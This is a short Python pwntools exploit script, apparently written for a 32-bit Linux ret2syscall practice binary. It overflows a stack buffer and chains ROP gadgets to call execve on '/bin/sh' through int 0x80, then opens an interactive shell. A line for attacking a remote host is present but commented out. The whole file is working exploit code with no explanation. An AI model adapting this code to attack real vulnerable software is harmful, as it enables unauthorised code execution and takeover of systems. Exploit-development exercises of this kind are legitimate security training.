from pwn import *

context(log_level='debug', arch='i386', os='linux')
pwnfile = './ret2syscall'
# io = remote('ipaddr', port)
io = process(pwnfile)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

pop_eax_addr = 0x080bb196
edx_ecx_ebx_addr =0x0806eb90
padding2ebp = 0x6C # from the var to ebp
padding = padding2ebp + context.word_size//8
sh_addr = 0x80be408
int_addr = 0x08049421

payload = flat([cyclic(padding), pop_eax_addr, 0xb, edx_ecx_ebx_addr, 0, 0, sh_addr, int_addr])
delimiter = "\n"
io.sendlineafter(delimiter, payload)
io.interactive()
